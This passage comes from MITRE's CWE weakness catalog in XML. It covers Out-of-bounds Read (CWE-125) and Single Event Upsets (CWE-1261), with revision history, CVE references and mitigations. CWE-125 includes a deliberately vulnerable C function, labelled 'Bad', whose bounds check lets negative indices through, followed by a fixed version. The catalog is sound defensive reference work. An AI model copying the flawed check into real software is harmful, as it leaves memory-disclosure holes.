					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Contribution Type="Content">
				  <Contribution_Name>Parbati K. Manna</Contribution_Name>
				  <Contribution_Organization>Intel Corporation</Contribution_Organization>
				  <Contribution_Date>2021-10-18</Contribution_Date>
				  <Contribution_Comment>provided detection methods</Contribution_Comment>
				</Contribution>
			<Previous_Entry_Name Date="2020-08-20">Missing Protection Against Voltage and Clock Glitches</Previous_Entry_Name>
			<Previous_Entry_Name Date="2021-10-28">Missing or Improperly Implemented Protection Against Voltage and Clock Glitches</Previous_Entry_Name>
      </Content_History>
    </Weakness>
      <Weakness ID="125" Name="Out-of-bounds Read" Abstraction="Base" Structure="Simple" Status="Draft" Diagram="/data/images/CWE-125-Diagram.png">
         <Description>The product reads data past the end, or before the beginning, of the intended buffer.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1003" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1305" Ordinal="Primary"/>
			 <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
			   <Description>When an out-of-bounds read occurs, typically the product has already made a separate mistake, such as modifying an index or performing pointer arithmetic that produces an out-of-bounds address.</Description>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="C" Prevalence="Undetermined"/>
            <Language Name="C++" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>OOB read</Term>
			   <Description>Shorthand for "Out of bounds" read</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Memory</Impact>
			   <Note>An attacker could get secret values such as cryptographic keys, PII, memory addresses, or other information that could be used in additional attacks.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>Out-of-bounds memory could contain memory addresses or other information that can be used to bypass ASLR and other protection mechanisms in order to improve the reliability of exploiting a separate weakness for code execution.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>An attacker could cause a segmentation fault or crash by causing memory to be read outside of the bounds of the buffer. This is especially likely when the code reads a variable amount of data and assumes that a sentinel exists to stop the read operation, such as a NUL in a string.</Note>
            </Consequence>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
               <Note>The read operation could produce other undefined or unexpected results.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-13">
             <Method>Fuzzing</Method>
             <Description>Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>To reduce the likelihood of introducing an out-of-bounds read, ensure that you validate and ensure correct calculations for any length argument, buffer size calculation, or offset. Be especially careful of relying on a sentinel (i.e. special character such as NUL) in untrusted inputs.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Language Selection</Strategy>
               <Description>Use a language that provides appropriate memory abstractions.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-100">
               <Intro_Text>In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int getValueFromArray(int *array, int len, int index) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>int value;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// check that the array index is less than the maximum</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// length of the array</xhtml:i>
                           <xhtml:br/>if (index &lt; len) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 <xhtml:br/>
                                 <xhtml:i>// get the value at the specified index of the array</xhtml:i>
                                 <xhtml:br/>value = array[index];</xhtml:div>
                           </xhtml:div>}<xhtml:br/>
                           <xhtml:i>// if array index is invalid then output error message</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// and return value indicating error</xhtml:i>
                           <xhtml:br/>else {<xhtml:div style="margin-left:1em;">printf("Value is: %d\n", array[index]);<xhtml:br/>value = -1;</xhtml:div>}<xhtml:br/>
                           <xhtml:br/>return value;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, this method only verifies that the given array index is less than the maximum length of the array but does not check for the minimum value (CWE-839). This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read (CWE-125) and may allow access to sensitive memory. The input array index should be checked to verify that is within the maximum and minimum range required for the array (CWE-129). In this example the if statement should be modified to include a minimum range check, as shown below.</Body_Text>
               <Example_Code Nature="Good" Language="C">
                  <xhtml:div>
                     <xhtml:br/>...<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// check that the array index is within the correct</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// range of values for the array</xhtml:i>
                     <xhtml:br/>if (index &gt;= 0 &amp;&amp; index &lt; len) {<xhtml:br/>
                     <xhtml:br/>...</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2020-11899</Reference>
               <Description>Out-of-bounds read in IP stack used in embedded systems, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-11899</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2014-0160</Reference>
               <Description>Chain: "Heartbleed" bug receives an inconsistent length parameter (CWE-130) enabling an out-of-bounds read (CWE-126), returning memory that could include private cryptographic keys and other sensitive data.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2014-0160</Link>
            </Observed_Example>
			<Observed_Example>
			  <Reference>CVE-2021-40985</Reference>
			  <Description>HTML conversion package has a buffer under-read, allowing a crash</Description>
			  <Link>https://www.cve.org/CVERecord?id=CVE-2021-40985</Link>
			</Observed_Example>
            <Observed_Example>
               <Reference>CVE-2018-10887</Reference>
               <Description>Chain: unexpected sign extension (CWE-194) leads to integer overflow (CWE-190), causing an out-of-bounds read (CWE-125)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2018-10887</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2523</Reference>
               <Description>Chain: product does not handle when an input string is not NULL terminated (CWE-170), leading to buffer over-read (CWE-125) or heap-based buffer overflow (CWE-122).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2523</Link>
            </Observed_Example>
	    <Observed_Example>
	      <Reference>CVE-2018-16069</Reference>
	      <Description>Chain: series of floating-point precision errors
	      (CWE-1339) in a web browser rendering engine causes out-of-bounds read
	      (CWE-125), giving access to cross-origin data</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2018-16069</Link>
	    </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0112</Reference>
               <Description>out-of-bounds read due to improper length check</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0112</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0183</Reference>
               <Description>packet with large number of specified elements cause out-of-bounds read.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0183</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0221</Reference>
               <Description>packet with large number of specified elements cause out-of-bounds read.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0221</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0184</Reference>
               <Description>out-of-bounds read, resultant from integer underflow</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0184</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1940</Reference>
               <Description>large length value causes out-of-bounds read</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1940</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0421</Reference>
               <Description>malformed image causes out-of-bounds read</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0421</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4113</Reference>
               <Description>OS kernel trusts userland-supplied length value, allowing reading of sensitive information</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4113</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Out-of-bounds Read</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ARR30-C</Entry_ID>
               <Entry_Name>Do not form or use out-of-bounds pointers or array subscripts</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ARR38-C</Entry_ID>
               <Entry_Name>Guarantee that library functions do not form invalid pointers</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>EXP39-C</Entry_ID>
               <Entry_Name>Do not access a variable through a pointer of an incompatible type</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>STR31-C</Entry_ID>
               <Entry_Name>Guarantee that storage for strings has sufficient space for character data and the null terminator</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>STR32-C</Entry_ID>
               <Entry_Name>Do not pass a non-null-terminated character sequence to a library function that expects a string</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP8</Entry_ID>
               <Entry_Name>Faulty Buffer Access</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="540"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-1034"/>
            <Reference External_Reference_ID="REF-1035"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 5: Buffer Overruns.&#34; Page 89"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Causal_Nature, Observed_Examples, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Research_Gaps</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-07-16</Modification_Date>
					<Modification_Version>4.15</Modification_Version>
					<Modification_ReleaseDate>2024-07-16</Modification_ReleaseDate>
					<Modification_Comment>updated Alternate_Terms, Common_Consequences, Description, Diagram, Weakness_Ordinalities</Modification_Comment>
				</Modification>
	    <Contribution Type="Content">
	      <Contribution_Name>Abhi Balakrishnan</Contribution_Name>
	      <Contribution_Date>2024-02-29</Contribution_Date>
	      <Contribution_Version>4.15</Contribution_Version>
	      <Contribution_ReleaseDate>2024-07-16</Contribution_ReleaseDate>
	      <Contribution_Comment>Provided diagram to improve CWE usability</Contribution_Comment>
	    </Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="1261" Name="Improper Handling of Single Event Upsets" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The hardware logic does not effectively handle when single-event upsets (SEUs) occur.</Description>
         <Extended_Description>
            <xhtml:p>Technology trends such as CMOS-transistor down-sizing, use of 
            new materials, and system-on-chip architectures continue to increase the 
            sensitivity of systems to soft errors. These errors are random, and 
            their causes might be internal (e.g., interconnect coupling) or external 
            (e.g., cosmic radiation). These soft errors are not permanent in nature 
            and cause temporary bit flips known as single-event upsets (SEUs). 
            SEUs are induced errors in circuits caused when charged particles lose 
            energy by ionizing the medium through which they pass, leaving behind a 
            wake of electron-hole pairs that cause temporary failures. If these 
            failures occur in security-sensitive modules in a chip, it might 
            compromise the security guarantees of the chip. For instance, these 
            temporary failures could be bit flips that change the privilege of
	    a regular user to root.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
				<Related_Weakness Nature="ChildOf" CWE_ID="1384" View_ID="1000" Ordinal="Primary"/>
				<Related_Weakness Nature="PeerOf" CWE_ID="1254" View_ID="1000" Ordinal="Primary"/>
			</Related_Weaknesses>
         <Applicable_Platforms>	
				<Language Class="Not Language-Specific" Prevalence="Undetermined"/>
				<Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
				<Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
            <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>DoS: Instability</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
				<Mitigation>
					<Phase>Architecture and Design</Phase>
					<Description>
						<xhtml:p>Implement triple-modular redundancy around security-sensitive modules.</xhtml:p>
					</Description>
				</Mitigation>
				<Mitigation>
					<Phase>Architecture and Design</Phase>
					<Description>
						<xhtml:p>SEUs mostly affect SRAMs.  For SRAMs storing security-critical data, implement Error-Correcting-Codes (ECC) and Address Interleaving.</xhtml:p>
					</Description>
				</Mitigation>
			</Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This is an example from [REF-1089].  See the reference for full details of this issue.</Intro_Text>
               <Body_Text>Parity is error detecting but not error correcting.</Body_Text>
               <Example_Code Nature="Bad" Language="Other">Due to single-event upsets, bits are flipped in memories.  As a result, memory-parity checks fail, which results in restart and a temporary denial of service of two to three minutes.</Example_Code>
               <Example_Code Nature="Good" Language="Other">Using error-correcting codes could have avoided the restart caused by SEUs. </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In 2016, a security researcher, who was also a patient using a pacemaker, was on an airplane when a bit flip occurred in the pacemaker, likely due to the higher prevalence of cosmic radiation at such heights. The pacemaker was designed to account for bit flips and went into a default safe mode, which still forced the patient to go to a hospital to get it reset. The bit flip also inadvertently enabled the researcher to access the crash file, perform reverse engineering, and detect a hard-coded key. [REF-1101]</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <References>
            <Reference External_Reference_ID="REF-1086"/>
            <Reference External_Reference_ID="REF-1087"/>
            <Reference External_Reference_ID="REF-1088"/>
            <Reference External_Reference_ID="REF-1089"/>
            <Reference External_Reference_ID="REF-1090"/>
            <Reference External_Reference_ID="REF-1091"/>
            <Reference External_Reference_ID="REF-1101"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Arun Kanuparthi, Hareesh Khattri, Parbati Kumar Manna, Narasimha Kumar V Mangipudi</Submission_Name>
               <Submission_Organization>Intel Corporation</Submission_Organization>
               <Submission_Date>2020-02-12</Submission_Date>
               <Submission_Version>4.1</Submission_Version>
               <Submission_ReleaseDate>2020-02-24</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1263" Name="Improper Physical Access Control" Abstraction="Class" Structure="Simple" Status="Incomplete">
			<Description>The product is designed with access restricted to certain information, but it does not sufficiently protect against an unauthorized actor with physical access to these areas.</Description>
			<Extended_Description>Sections of a product intended to have restricted access may be inadvertently or intentionally rendered accessible when the implemented physical protections are insufficient. The specific requirements around how robust the design of the physical protection mechanism needs to be depends on the type of product being protected. Selecting the correct physical protection mechanism and properly enforcing it through implementation and manufacturing are critical to the overall physical security of the product.
			</Extended_Description>
			<Related_Weaknesses>
				<Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
				<Related_Weakness Nature="PeerOf" CWE_ID="1191" View_ID="1000"/>
			</Related_Weaknesses>
			<Applicable_Platforms>
				<Language Class="Not Language-Specific" Prevalence="Undetermined"/>
				<Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
				<Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
				<Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
				</Applicable_Platforms>
			<Modes_Of_Introduction>
				<Introduction>
					<Phase>Architecture and Design</Phase>
					<Note>This weakness can arise if design decisions are made that do not align with the intended physical protection of the product</Note>
				</Introduction>
				<Introduction>
					<Phase>Manufacturing</Phase>
					<Note>While the architecture and design phase of the product may have accurately met the intended robustness for product physical protections, this phase may introduce the weakness through errors in physically manufacturing the product.</Note>
				</Introduction>
			</Modes_Of_Introduction>
			<Common_Consequences>
				<Consequence>
					<Scope>Confidentiality</Scope>
					<Scope>Integrity</Scope>
					<Scope>Access Control</Scope>
					<Impact>Varies by Context</Impact>
				</Consequence>
			</Common_Consequences>
			<Potential_Mitigations>
				<Mitigation>
					<Phase>Architecture and Design</Phase>
					<Description>Specific protection requirements depend strongly on contextual factors including the level of acceptable risk associated with compromise to the product's protection mechanism. Designers could incorporate anti-tampering measures that protect against or detect when the product has been tampered with.</Description>
				</Mitigation>
				<Mitigation>
				  <Phase>Testing</Phase>
				  <Description>The testing phase of the lifecycle should establish a method for determining whether the protection mechanism is sufficient to prevent unauthorized access.</Description>
				</Mitigation>
				<Mitigation>
					<Phase>Manufacturing</Phase>
					<Description>Ensure that all protection mechanisms are fully activated at the time of manufacturing and distribution.</Description>
				</Mitigation>
			</Potential_Mitigations>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="401"/>
